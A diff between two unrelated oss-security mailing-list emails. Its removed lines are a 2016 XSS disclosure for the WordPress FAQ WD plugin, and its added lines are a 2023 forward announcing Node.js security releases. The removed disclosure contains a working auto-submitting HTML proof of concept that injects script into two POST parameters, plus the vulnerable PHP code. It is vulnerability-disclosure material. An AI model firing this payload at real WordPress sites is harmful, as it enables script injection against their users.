@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1992" "Saturday" "16" "April" "2016" "14:01:20" "+0530" "shravan kumar" "cor3sm4sh3r@gmail.com" "<CAOmn9FRZhAZDacr=szRqSYdxD5R_c_FinN=Zg6wdehO2M+qTzQ@mail.gmail.com>" "74" "[oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14." nil nil nil "4" "2016041608:31:20" "[oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14." (number mark "U       cor3sm4sh3r@ Apr 16   74/1992  " thread-indent "\"[oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 28132 invoked by uid 550); 16 Apr 2016 09:26:33 -0000
+Received: (qmail 30427 invoked by uid 550); 8 Aug 2023 13:03:00 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,109 +7,99 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 6083 invoked from network); 16 Apr 2016 08:31:32 -0000
+Received: (qmail 1809 invoked from network); 8 Aug 2023 08:52:36 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=nearform.com;
+ h=content-type:content-type:date:date:from:from:in-reply-to:in-reply-to:message-id:message-id:mime-version:mime-version:references:references:subject:subject:to:to;
+ s=selector-1636637189; bh=OdefCIz/lSDjzXAk/emTvlT1USYk6AQF7K3wGpY0Hbk=;
+ b=2dnxDRr0G7dnRbgU8p3axB3ceWPAnSA5OE8aIQL5rlVqyRTSUGY4zTGwsYegHU0wQWWb3AhnOOjAYYvw2hn/5cPLi2EPCeiAQMm8Ic5DF+/5bM4NnS9J8zTeVH3pMmu3dWoXup976AFYu65qpAyZfGWCVFwZdem1pzDpmRmagZg25hMJyLEHFcSyfJcuTGbCCGCbQ6yEft9k0uC/2KLfQr8N6LYvhB2n+MBjJINbDS1R9puc6NiF33XdQ5h7nkt60j6U8/PVuGODwvMCCGQVRjNcfVqiVWR9RM+y0dLpvlsadV4c7doqMDmCzluWJfSnQ9IF6onkn5xsInQACB18iA==
+X-MDID: 1690814970-xPTXDV4_fkIV
+Resent-From: "Proofpoint Essentials" <do-not-reply@proofpointessentials.com>
+Resent-To: <oss-security@lists.openwall.com>
+Resent-Date: Mon, 31 Jul 2023 14:49:30 +0000 (UTC)
+Resent-Message-ID: <xPTXDV4_fkIV-umz0c10qfBEw@eu1-mdac22-12.eu1.mdlocal>
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:date:message-id:subject:from:to;
-        bh=Zg5/rIMeAOUVUvlDHBr5sLFXhYLB+1MfndRHE/UTZy4=;
-        b=n/vOBJRf1w/lzvebczoIDRILerAc5ktBo3Cv4E4fGZiRb2YOmkVeGAdgU3Kx8cbdR+
-         2ro4hwkrsHqhbfU1mDfa/0n5UtbI/SXGZAq+eGfYYd5OYJ/cByQ5E2VsrZc6r+YiWk7z
-         ZITmvL8AeUZufrsRGcu6pTPs3wYonH6Prd9Tc3cjZevpg3WFgACE3FVcGXHexWcNmqgc
-         NZFZnSlIGV/HQFGKYc3n0FMZakeS1zbwQKglamsTBtRLNivxmVlneYvgdbo316XHp9nc
-         7blO1KzgJuR78eN/OKzEsql9Cyat1E3s3u8jFdpdJSJVtGVU9qwEGkLr2WTqD0613O+8
-         VPMQ==
+        d=nearform.com; s=gmail; t=1690814968; x=1691419768;
+        h=mime-version:subject:references:in-reply-to:message-id:to:from:date
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=OdefCIz/lSDjzXAk/emTvlT1USYk6AQF7K3wGpY0Hbk=;
+        b=f30Jmv4+vjGzlctdSG72wntAa4t/ZZ5X5WSyn8tcS5sgMmidmtGo/cm/lfTO7cwcaW
+         N7XQZimoFsQykoSF0A3hoMrjfYDjHXxLJkW+0evpuVPQ0PyAowaXT2n0VYE50/TPaRp7
+         s19U3xKXvJce+o6I4Y6vSG3mNhuv8eaXv16nfrcmSSabB8yE4Gxsngi/t94pAKi7vDWQ
+         KUAjfxjGfWahMTghphM7tGkWwAPrX6UhNAATXQwXjoorg+ZL2awLfRQSBXzLq442OXY5
+         RrLNBXQHp+60HKgXm5o8VQKz+TWl97tIW0N8gYtaaMtyff4ccEBlqM51M3aYOTrPoeVr
+         Qt/g==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
-        bh=Zg5/rIMeAOUVUvlDHBr5sLFXhYLB+1MfndRHE/UTZy4=;
-        b=ZkwsHa3QakLnaO2NwRC5Y3TLXUJ0rQGJUeOL7ls4bSDwka8JdquzGubNfCZvo/lV5D
-         Rxp5+kxig+rYFtM9oW37VjxGvA8YM/Hj65dybtXazh5sZLeaIJfMoLCH0/JX9n4wkgAS
-         gFdgGu6cKfM46ivgfx09YEmVfKdLhv3ltup/rpdnA5CFBdQr/KZcEPncTQDQu+PhmHJ+
-         KDwBu1QbOb7e0r/8vvImAMcFJd3vmqH7MItEEEY+kCZopMFUS/gNGPiCkKuBqo72+odQ
-         UgbTlvLEQzqEVQpRdhh/ZOO9PQ7frq55ItlM/oBvbkGc2D0peAkuquyqz0j+jD8eMScQ
-         PDug==
-X-Gm-Message-State: AOPr4FUlaHP4ipec86Iie7WXHZnY3nVZvgNNOZTCjmDJULKsfeG69HIojvvjfXfQQ1aA6hKxyOOcTzW3LYdBCQ==
+        d=1e100.net; s=20221208; t=1690814968; x=1691419768;
+        h=mime-version:subject:references:in-reply-to:message-id:to:from:date
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=OdefCIz/lSDjzXAk/emTvlT1USYk6AQF7K3wGpY0Hbk=;
+        b=K2nyU8ihiGW4T6nmQV43+g/gUXOpYXYU0CMz8tLzOTQ3NZrlhV6kpMQLcv1FSUS4vu
+         usFn1ijt3bTUe48j5EfKWVJ5l7cilPTSDeB1UDZnGdyMa39OTfl8WN6i/zom8k3J8q83
+         jYWkxCitQhjs931nsyQYTBmfq9rVca68n8hyD01Q2z0zpU3oiZW4s+UmXi/m0FgaHc4u
+         GQSSyb32UL2SivLPiAZdSwF5p36r8JwwiUbwThcHeBq4zzr79bxJYegnUYOu0Ub21Hth
+         hqQCxBaKOYTp9Ehlh/TaI/jwXOyyS7q5pTdLOQcZ1Zoq55feHzgscNdNZNu+4C+XPbd9
+         iSSw==
+X-Gm-Message-State: ABy/qLbhoLVTpuqZCSZNAs4pqGTiaUBxPtd9G2nAJa2tHs9PwUNprBkW
+	aLFJS/GS/Yz397JP8yCJx2Tx6Y9H+EY2fageRZsTGyTLMfojIj69w/Xt0EPXk/fHWSnjeBnw9YR
+	qRHRQDBsRQRmttfLznlYGRMrIr/0k6km6oez1hSw0N4jC5XXRol0jraa+aRqmPZoH
+X-Received: by 2002:a05:6870:3a29:b0:1bb:b8f0:5878 with SMTP id du41-20020a0568703a2900b001bbb8f05878mr12395622oab.5.1690814968081;
+        Mon, 31 Jul 2023 07:49:28 -0700 (PDT)
+X-Google-Smtp-Source: APBJJlHh3une8vFYD00PVBZEv3z4MgMpjc5XNzdJiU8JQep50TpZuC90qAlliVaNttuY/qHNizStEv+4jQ==
+X-Received: by 2002:a05:6870:3a29:b0:1bb:b8f0:5878 with SMTP id du41-20020a0568703a2900b001bbb8f05878mr12395597oab.5.1690814967638;
+        Mon, 31 Jul 2023 07:49:27 -0700 (PDT)
+Date: Mon, 31 Jul 2023 07:49:27 -0700 (PDT)
+From: Rafael Silva <rafael.silva@nearform.com>
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+Message-Id: <69edd0e8-5d29-43ab-b18a-524bbb517944n@googlegroups.com>
+In-Reply-To: <f3d796bc-e2ff-4d61-8820-e10ca8068ad4n@googlegroups.com>
+References: <f3d796bc-e2ff-4d61-8820-e10ca8068ad4n@googlegroups.com>
 MIME-Version: 1.0
-X-Received: by 10.107.140.202 with SMTP id o193mr27482483iod.161.1460795480988;
- Sat, 16 Apr 2016 01:31:20 -0700 (PDT)
-Date: Sat, 16 Apr 2016 14:01:20 +0530
-Message-ID: <CAOmn9FRZhAZDacr=szRqSYdxD5R_c_FinN=Zg6wdehO2M+qTzQ@mail.gmail.com>
-From: shravan kumar <cor3sm4sh3r@gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary=94eb2c060bfebbe42e053095f3fe
-Subject: [oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14.
+Content-Type: multipart/mixed; 
+	boundary="----=_Part_41408_435169809.1690814967411"
+X-MDID-O:
+ eu1;fra;1690814970;xPTXDV4_fkIV;<rafael.silva@nearform.com>;11bfa6aa9c040cf23bc591a6d91f8f65
+Subject: [oss-security] Fwd: Node.js security updates for all active release lines, August
+ 2023
 
---94eb2c060bfebbe42e053095f3fe
+------=_Part_41408_435169809.1690814967411
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_41409_9866570.1690814967411"
+
+------=_Part_41409_9866570.1690814967411
 Content-Type: text/plain; charset=UTF-8
-
-Hello,
-
-I would like to report a Unauthenticated XSS vulnerability in FAQ WD
- plugin version 1.0.14 .
-
-The Plugin can be found at https://wordpress.org/plugins/faq-wd/
-
-This Bug can be triggered by unauthenticated / Authenticated user. If a
-user is sent a URL by social engineering and the user clicks the link the
-bug can be triggred.
-
-The URL should be something like this
-
-http://attackerssite.com/XSS_POC.html
+Content-Transfer-Encoding: quoted-printable
 
 
 
-The code for XSS_POC.html is as follows:
+---------- Forwarded message ---------
+From: Rafael Silva <rafael.silva@nearform.com>
+Date: Monday, July 31, 2023 at 11:48:26=E2=80=AFAM UTC-3
+Subject: Node.js security updates for all active release lines, August 2023
+To: nodejs-sec <nodejs-sec@googlegroups.com>
 
 
-<html>
-  <body onload="document.forms['xss'].submit()" >
-    <form name="xss" action="
-http://targetsite/wpinstallation/wp-content/plugins/faq-wd/lang/views/SLangViewPo.php"
-method="POST" >
+The Node.js project will release new versions of all supported release=20
+lines on or shortly after Tuesday, August 8th, 2023.
 
-  <input type="hidden" name="lang_err_mess" value="
-<script>alert(1);</script>" />
-<input type="hidden" name="lang_success_synchron" value="
-<script>alert(2);</script>" />
-      <input type="submit" value="Submit form" />
-    </form>
-  </body>
-</html>
+For more information see:=20
+https://nodejs.org/en/blog/vulnerability/august-2023-security-releases/
 
+------=_Part_41409_9866570.1690814967411
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
 
-Techinical Details:
+<br /><br /><div><div dir=3D"auto">---------- Forwarded message ---------<b=
+r />From: <span dir=3D"auto">Rafael Silva &lt;rafael.silva@nearform.com&gt;=
+</span><br />Date: Monday, July 31, 2023 at 11:48:26=E2=80=AFAM UTC-3<br />=
+Subject: Node.js security updates for all active release lines, August 2023=
+<br />To: <span dir=3D"auto">nodejs-sec &lt;nodejs-sec@googlegroups.com&gt;=
+</span><br /></div><br /><br />The Node.js project will release new version=
+s of all supported release lines on or shortly after Tuesday, August 8th, 2=
+023.<div><br /></div><div>For more information see: <a href=3D"https://node=
+js.org/en/blog/vulnerability/august-2023-security-releases/" target=3D"_bla=
+nk" rel=3D"nofollow">https://nodejs.org/en/blog/vulnerability/august-2023-s=
+ecurity-releases/</a><br /></div></div>=
 
-The vulnerable page is
+------=_Part_41409_9866570.1690814967411--
 
-wp-content/plugins/faq-wd/lang/views/SLangViewPo.php
-
-This page can be directly accessed by anyone.
-
-The Code responsible for the vulnerability :
-<?php if (isset($_POST['lang_err_mess'])): ?>
-    <div class="error" style="display: inline-block;width: 100%"><p><?php
-echo $_POST['lang_err_mess']; ?></p></div>
-<?php elseif (isset($_POST['lang_success'])): ?>
-    <div class="updated" style="display: inline-block;width: 100%"><p><?php
-echo 'File was successfully updated.'; ?></p></div>
-<?php endif; ?>
-<?php if (isset($_POST['lang_success_synchron'])): ?>
-    <div class="updated" style="display: inline-block;width: 100%"><p><?php
-echo $_POST['lang_success_synchron']; ?></p></div>
-<?php endif; ?>
-
-
-Here we can see that there are two post request which are displayed in
-unsafe manner while rendering the page.
-
-The vulnerable POST parameters are:
-
-   - $_POST['lang_err_mess']
-   - $_POST['lang_success_synchron']
-
-
--- 
-Shravan Kumar
-
---94eb2c060bfebbe42e053095f3fe--
+------=_Part_41408_435169809.1690814967411--
